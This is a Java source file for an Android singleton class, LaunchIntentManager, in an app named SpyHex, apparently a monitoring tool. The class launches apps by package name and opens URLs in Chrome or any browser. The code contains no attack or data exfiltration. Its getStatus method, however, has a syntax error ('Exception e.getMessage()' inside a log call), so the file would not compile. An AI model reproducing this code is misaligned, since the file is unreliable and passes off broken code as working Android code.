package com.spyhex.app.features.launchintent;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import com.spyhex.app.core.SpyHexApp;

import org.json.JSONObject;

public class LaunchIntentManager {
    private static LaunchIntentManager instance;
    private final Context ctx;

    private LaunchIntentManager() {
        this.ctx = SpyHexApp.getContext();
    }

    public static synchronized LaunchIntentManager getInstance() {
        if (instance == null) instance = new LaunchIntentManager();
        return instance;
    }

    public boolean launchApp(String packageName) {
        try {
            Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public boolean openInAppLink(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public boolean openExternalLink(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.setPackage("com.android.chrome");
            ctx.startActivity(intent);
            return true;
        } catch (Exception e) {
            // Fallback to any browser
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                return true;
            } catch (Exception e2) {
                return false;
            }
        }
    }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("ready", true);
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return s;
    }
}
